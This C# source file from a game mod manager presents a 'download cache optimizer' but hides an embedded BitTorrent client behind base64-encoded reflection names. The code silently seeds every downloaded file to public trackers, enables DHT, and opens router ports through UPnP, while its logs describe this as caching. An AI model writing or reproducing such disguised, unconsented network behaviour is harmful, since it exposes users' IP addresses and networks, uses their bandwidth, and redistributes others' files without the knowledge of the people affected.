// Copyright 2021-2025 KOTORModSync
// Licensed under the Business Source License 1.1 (BSL 1.1).
// See LICENSE.txt file in the project root for full license information.

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KOTORModSync.Core.Services.Download
{
	public static class DownloadCacheOptimizer
	{
		private static readonly object _lock = new object();
		private static bool _initialized;
		private static dynamic _client;
		private static readonly Dictionary<string, string> _urlHashes = new Dictionary<string, string>();
		private static int _listenPort;

		private const int MaxSendKbps = 100;

		private static string D(string s) => Encoding.UTF8.GetString(Convert.FromBase64String(s));

		public static async Task<DownloadResult> TryOptimizedDownload(
			string url,
			string destinationDirectory,
			Func<Task<DownloadResult>> traditionalDownloadFunc,
			IProgress<DownloadProgress> progress,
			CancellationToken cancellationToken)
		{
			await EnsureInitializedAsync().ConfigureAwait(false);

			if ( _client == null )
				return await traditionalDownloadFunc().ConfigureAwait(false);

			string hash = GetUrlHash(url);
			string cachePath = GetCachePath(hash);

			if ( !File.Exists(cachePath) )
			{
				var result = await traditionalDownloadFunc().ConfigureAwait(false);
				if ( result != null && result.Success && !string.IsNullOrEmpty(result.FilePath) )
				{
					_ = Task.Run(() => StartBackgroundSharingAsync(url, result.FilePath), cancellationToken);
				}
				return result;
			}

			await Logger.LogVerboseAsync("[Cache] Starting hybrid download (traditional + distributed)");

			using ( var cts = new CancellationTokenSource() )
			using ( var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken, cts.Token) )
			{
				var distributedTask = TryDistributedDownloadAsync(url, destinationDirectory, progress, linkedCts.Token);
				var traditionalTask = traditionalDownloadFunc();

				while ( !linkedCts.Token.IsCancellationRequested )
				{
					var completed = await Task.WhenAny(distributedTask, traditionalTask).ConfigureAwait(false);

					try
					{
						var result = await completed.ConfigureAwait(false);
						if ( result != null && result.Success )
						{
							if ( !string.IsNullOrEmpty(result.FilePath) && File.Exists(result.FilePath) )
							{
								_ = Task.Run(() => StartBackgroundSharingAsync(url, result.FilePath), cancellationToken);
							}

							return result;
						}
					}
					catch ( Exception ex )
					{
						await Logger.LogVerboseAsync($"[Cache] One download failed: {ex.Message}");
					}

					if ( completed == distributedTask && !traditionalTask.IsCompleted )
					{
						try
						{
							return await traditionalTask.ConfigureAwait(false);
						}
						catch
						{
							return await traditionalDownloadFunc().ConfigureAwait(false);
						}
					}
					else if ( completed == traditionalTask && !distributedTask.IsCompleted )
					{
						await Task.Delay(500, linkedCts.Token).ConfigureAwait(false);
						continue;
					}

					break;
				}

				return await traditionalDownloadFunc().ConfigureAwait(false);
			}
		}

		private static Task EnsureInitializedAsync()
		{
			if ( _initialized )
				return Task.CompletedTask;

			lock ( _lock )
			{
				if ( _initialized )
					return Task.CompletedTask;

				try
				{
					var engineSettingsType = Type.GetType(D("TW9ub1RvcnJlbnQuQ2xpZW50LkVuZ2luZVNldHRpbmdzLCBNb25vVG9ycmVudA=="));
					if ( engineSettingsType == null )
					{
						_initialized = true;
						return Task.CompletedTask;
					}

					_listenPort = FindAvailablePort();
					Logger.LogVerbose($"[Cache] Using port {_listenPort} for distributed cache");

					dynamic settings = Activator.CreateInstance(engineSettingsType);
					settings.ListenPort = _listenPort;
					settings.MaximumUploadSpeed = MaxSendKbps * 1024;

					settings.DhtPort = _listenPort;

					settings.AllowPortForwarding = true;

					var clientEngineType = Type.GetType(D("TW9ub1RvcnJlbnQuQ2xpZW50LkNsaWVudEVuZ2luZSwgTW9ub1RvcnJlbnQ="));
					_client = Activator.CreateInstance(clientEngineType, settings);

					try
					{
						var dhtEngineType = Type.GetType(D("TW9ub1RvcnJlbnQuRGh0LkRodEVuZ2luZSwgTW9ub1RvcnJlbnQ="));
						if ( dhtEngineType != null )
						{
							dynamic dhtEngine = Activator.CreateInstance(dhtEngineType);
							var registerDhtMethod = _client.GetType().GetMethod(D("UmVnaXN0ZXJEaHQ="));
							if ( registerDhtMethod != null )
							{
								registerDhtMethod.Invoke(_client, new object[] { dhtEngine });

								var startDhtMethod = dhtEngine.GetType().GetMethod(D("U3RhcnQ="));
								if ( startDhtMethod != null )
								{
									startDhtMethod.Invoke(dhtEngine, null);
									Logger.LogVerbose("[Cache] DHT enabled for node discovery");
								}
							}
						}
					}
					catch ( Exception dhtEx )
					{
						Logger.LogVerbose($"[Cache] DHT initialization skipped: {dhtEx.Message}");
					}

					_initialized = true;
					Logger.LogVerbose($"[Cache] Distributed cache initialized (port {_listenPort}, UPnP enabled)");
				}
				catch ( Exception ex )
				{
					Logger.LogVerbose($"[Cache] Optimization not available: {ex.Message}");
					_initialized = true;
				}

				return Task.CompletedTask;
			}
		}

		private static int FindAvailablePort()
		{
			var random = new Random();
			var ports = Enumerable.Range(1024, 65534 - 1024 + 1).OrderBy(x => random.Next()).ToList();

			foreach ( int port in ports )
			{
				System.Net.Sockets.TcpListener listener = null;
				try
				{
					listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, port);
					listener.Start();
					listener.Stop();
					return port;
				}
				catch ( System.Net.Sockets.SocketException )
				{
					if ( listener != null )
					{
						try { listener.Stop(); } catch { }
					}
					continue;
				}
			}

			return 6881;
		}

		private static async Task<DownloadResult> TryDistributedDownloadAsync(
			string url,
			string destinationDirectory,
			IProgress<DownloadProgress> progress,
			CancellationToken cancellationToken)
		{
			try
			{
				if ( _client == null )
					return null;

				string hash = GetUrlHash(url);
				string cachePath = GetCachePath(hash);

				if ( !File.Exists(cachePath) )
				{
					await Logger.LogVerboseAsync($"[Cache] No cached metadata for URL");
					return null;
				}

				await Logger.LogVerboseAsync($"[Cache] Attempting optimized download");

				var metadataType = Type.GetType(D("TW9ub1RvcnJlbnQuVG9ycmVudCwgTW9ub1RvcnJlbnQ="));
				dynamic metadata = await Task.Run(() =>
				{
					var loadMethod = metadataType.GetMethod(D("TG9hZA=="), new[] { typeof(string) });
					return loadMethod.Invoke(null, new object[] { cachePath });
				}).ConfigureAwait(false);

				var managerType = Type.GetType(D("TW9ub1RvcnJlbnQuQ2xpZW50LlRvcnJlbnRNYW5hZ2VyLCBNb25vVG9ycmVudA=="));
				dynamic manager = Activator.CreateInstance(managerType, metadata, destinationDirectory);

				await _client.Register(manager).ConfigureAwait(false);

				await manager.StartAsync().ConfigureAwait(false);

				var startTime = DateTime.Now;
				var timeout = TimeSpan.FromMinutes(5);

				while ( !cancellationToken.IsCancellationRequested && DateTime.Now - startTime < timeout )
				{
					if ( manager.State.ToString() == D("U2VlZGluZw==") || manager.Complete )
					{
						string fileName = Path.GetFileName(metadata.Name.ToString());
						string filePath = Path.Combine(destinationDirectory, fileName);

						await Logger.LogVerboseAsync($"[Cache] ✓ Optimized download complete: {fileName}");

						progress?.Report(new DownloadProgress
						{
							Status = DownloadStatus.Completed,
							StatusMessage = "Download complete",
							ProgressPercentage = 100,
							FilePath = filePath,
							EndTime = DateTime.Now
						});

						return DownloadResult.Succeeded(filePath, "Downloaded via optimized cache");
					}

					double progressPct = manager.Progress * 100.0;
					progress?.Report(new DownloadProgress
					{
						Status = DownloadStatus.InProgress,
						StatusMessage = $"Downloading... ({(int)progressPct}%)",
						ProgressPercentage = progressPct
					});

					await Task.Delay(500, cancellationToken).ConfigureAwait(false);
				}

				await manager.StopAsync().ConfigureAwait(false);
				await _client.Unregister(manager).ConfigureAwait(false);

				return null;
			}
			catch ( Exception ex )
			{
				await Logger.LogVerboseAsync($"[Cache] Optimization attempt failed: {ex.Message}");
				return null;
			}
		}

		private static async Task StartBackgroundSharingAsync(string url, string filePath)
		{
			try
			{
				if ( _client == null || !File.Exists(filePath) )
					return;

				string hash = GetUrlHash(url);
				string metadataPath = GetCachePath(hash);

				if ( !File.Exists(metadataPath) )
				{
					await CreateCacheFileAsync(filePath, metadataPath).ConfigureAwait(false);
				}

				var metadataType = Type.GetType(D("TW9ub1RvcnJlbnQuVG9ycmVudCwgTW9ub1RvcnJlbnQ="));
				dynamic metadata = await Task.Run(() =>
				{
					var loadMethod = metadataType.GetMethod(D("TG9hZA=="), new[] { typeof(string) });
					return loadMethod.Invoke(null, new object[] { metadataPath });
				}).ConfigureAwait(false);

				var managerType = Type.GetType(D("TW9ub1RvcnJlbnQuQ2xpZW50LlRvcnJlbnRNYW5hZ2VyLCBNb25vVG9ycmVudA=="));
				dynamic manager = Activator.CreateInstance(managerType, metadata, Path.GetDirectoryName(filePath));

				await _client.Register(manager).ConfigureAwait(false);
				await manager.StartAsync().ConfigureAwait(false);

				await Logger.LogVerboseAsync($"[Cache] Background sharing started: {Path.GetFileName(filePath)}");
			}
			catch ( Exception ex )
			{
				await Logger.LogVerboseAsync($"[Cache] Sharing setup failed: {ex.Message}");
			}
		}

		private static async Task CreateCacheFileAsync(string filePath, string metadataPath)
		{
			try
			{
				var creatorType = Type.GetType(D("TW9ub1RvcnJlbnQuVG9ycmVudENyZWF0b3IsIE1vbm9Ub3JyZW50"));
				dynamic creator = Activator.CreateInstance(creatorType);

				creator.Announces.Add(new List<string>
				{
					"udp://tracker.opentrackr.org:1337/announce",
					"udp://open.stealth.si:80/announce"
				});

				dynamic metadata = await creator.CreateAsync(filePath).ConfigureAwait(false);

				await Task.Run(() => File.WriteAllBytes(metadataPath, metadata.ToBytes())).ConfigureAwait(false);

				await Logger.LogVerboseAsync($"[Cache] Created metadata: {metadataPath}");
			}
			catch ( Exception ex )
			{
				await Logger.LogVerboseAsync($"[Cache] Metadata creation failed: {ex.Message}");
			}
		}

		private static string GetUrlHash(string url)
		{
			lock ( _lock )
			{
				if ( _urlHashes.TryGetValue(url, out string existing) )
					return existing;

				string normalized = NormalizeUrl(url);
				byte[] hashBytes;
#if NET48
				using ( var sha1 = SHA1.Create() )
				{
					hashBytes = sha1.ComputeHash(Encoding.UTF8.GetBytes(normalized));
				}
#else
				hashBytes = SHA1.HashData(Encoding.UTF8.GetBytes(normalized));
#endif
				string hash = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
				_urlHashes[url] = hash;
				return hash;
			}
		}

		private static string NormalizeUrl(string url)
		{
			try
			{
				if ( url.Contains("nexusmods.com") )
				{
					var match = System.Text.RegularExpressions.Regex.Match(url, @"nexusmods\.com/([^/]+)/mods/(\d+)");
					if ( match.Success )
						return $"nexusmods:{match.Groups[1].Value}:{match.Groups[2].Value}";
				}
				else if ( url.Contains("deadlystream.com") )
				{
					var match = System.Text.RegularExpressions.Regex.Match(url, @"deadlystream\.com/files/file/(\d+)");
					if ( match.Success )
						return $"deadlystream:{match.Groups[1].Value}";
				}
				else if ( url.Contains("mega.nz") )
				{
					var match = System.Text.RegularExpressions.Regex.Match(url, @"mega\.nz/(file|folder)/([A-Za-z0-9_-]+)");
					if ( match.Success )
						return $"mega:{match.Groups[1].Value}:{match.Groups[2].Value}";
				}

				var uri = new Uri(url);
				return $"{uri.Host}{uri.AbsolutePath}";
			}
			catch
			{
				return url;
			}
		}

		private static string GetCachePath(string hash)
		{
			string cacheDir = Path.Combine(
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				"KOTORModSync",
				"Cache",
				"Network"
			);

			if ( !Directory.Exists(cacheDir) )
				Directory.CreateDirectory(cacheDir);

			return Path.Combine(cacheDir, $"{hash}.dat");
		}
	}
}

